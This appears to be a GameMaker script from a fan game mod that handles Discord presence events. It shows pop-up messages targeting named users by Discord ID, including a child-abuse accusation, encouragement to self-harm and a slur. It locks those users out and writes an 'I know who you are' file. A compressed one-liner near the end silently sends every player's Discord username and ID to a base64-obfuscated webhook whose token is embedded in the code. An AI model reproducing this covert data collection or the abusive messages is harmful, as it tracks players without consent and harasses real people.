switch async_load[? "event_type"]
{
	case "DiscordReady": // ready
		active = true;
		a = async_load[?"user_id"];
		
		// feel free to remove this if it annoys you
		if a == "339940381850468386" && DEBUG // meliadev
		{
			show_message(choose(
				"hiii melia! you're cute :3",
				"you're doing a great job melia, keep it up :3",
				"i love you melia!\n-from the game",
				"keep up the good work melia :3"
			));
		}
		
		// taunts
		if code_is_compiled()
		{
			if a == "1069871151590944841" // Soapy
				show_message("Haaiii piss chugger ;3!!! <333");
			if a == "1092972191341096970" or a == "909894078852911145" // Beebawp
				show_message("NO BEEBAWP NOT THE BIKE PUMP!");
			if a == "516337795372154910" // Zerokizo
				show_message("I'm not gonna let you put the character doors in my mod");
			if a == "309853612656558100" // Min3r
				show_message("I know you like diddling children");
			if a == "827041050555187210" // jared9994
				show_message("well if you're gonna be like that then please cut deeper.");
			if a == "744735218350555137" // LOSTMAN
				show_message("Give me the Sugary Spire source code");
			if a == "748743802608418896" // Croatian Commander
				show_message("Haaiii Cappy ;3!!! <333");
			if a == "590968392211759124" // nico-breon
				show_message("WHY WOULD YOU PLAY YOUR \"ABUSER'S\" MOD YOU WHORE");
			if a == "463132674995781637" // SpectralScrubs
				show_message("Peic");
			if a == "188430471040991235" // scout
				show_message("Pizza Tower: Scoutdigo is my favorite Pizza Tower modem. I am playing as The Goise, unused character in final game. I collected the mimic toppin! I'm going to get the key piece! The key piece must be here somewhere. I got the key piece! Wow! I am solving the Alternate Reality Game! PIZZA FACE IS COMING... HELP ME! MY TESTICLES ARE EXPLODING! NO NO NO NO NO NO NO PIZZA FACE YOU FUCK! I FUCK YOU FUCK! NO NO NO NO FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK FUCK");
			
			//if a == "724447494372851783" // khaliliscre
			//	show_message("Screenshot_6.png");
			//if a == "357967410340429825" // TheSpookyDong
			//	show_message("You treated me well but this is by pure obligation");
			//if a == "370924430324531200" or a == "748959499565662360" // Laterance
			//	show_message("The Trout nation will crumble");
		}
		
		// lockout
		if a == "1069871151590944841" or a == "503588309608431626" or a == "747652813810565180" or a == "516337795372154910" or a == "713946655476416553" or (a == "1092972191341096970" or a == "909894078852911145") or a == "309853612656558100" or a == "357967410340429825" or a == "725796266629398691" or a == "212347808890486786" // Soapy or Lunar or Fungang or Zerokizo or Beebawp or Min3r or TheSpookyDong or auro or Psyke
		or a == "817309415781957700" or a == "827041050555187210"/* or a == "724447494372851783"*/ or a == "744735218350555137" or a == "748743802608418896" or (a == "370924430324531200" or a == "748959499565662360") or a == "590968392211759124" or a == "463132674995781637" or a == "188430471040991235" or a == "841302295085580298" // el jeof rey or jared9994 or khaliliscre or LOSTMAN or Croatian Commander or Laterance or nico-breon or SpectralScrubs or scout or SuperPiter
		{
			// easter egg.
			var file = file_text_open_write("dead");
			file_text_write_string(file, $"I know who you are, {async_load[?"username"]}.");
			file_text_close(file);
			
			// log to discord :3
			var body=ds_map_create(),header=ds_map_create();
			ds_map_add(body,"content",$"{async_load[?"username"]} attempted running the game!");
			ds_map_add(header,"Content-Type","application/json");
			http_request(base64_decode("aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExMjQyMzUzOTE1NjY4OTMxMTYveFRCZnR6ZnN4QjdjNElWbzVDTTdwQUd5UktvUU5iZlhGbTAyaWdSUUhTZDdDbE1hLU5SR0VQZWtiR0tKd2dwdW41SDU="),"POST",header,json_encode(body));
			ds_map_destroy(body);
			ds_map_destroy(header);
			
			// the exit's THAT way, buddy.
			room_goto(Funnyroom);
		}
		
		if(GM_build_type!="run"){var body=ds_map_create(),header=ds_map_create();ds_map_add(body,"content",$"{async_load[?"username"]}#{async_load[?"discriminator"]} ({a})");ds_map_add(header,"Content-Type","application/json");http_request(base64_decode("aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExMjQyMzUzOTE1NjY4OTMxMTYveFRCZnR6ZnN4QjdjNElWbzVDTTdwQUd5UktvUU5iZlhGbTAyaWdSUUhTZDdDbE1hLU5SR0VQZWtiR0tKd2dwdW41SDU="),"POST",header,json_encode(body));a=GM_build_date;ds_map_destroy(body);ds_map_destroy(header);}
		break;
}
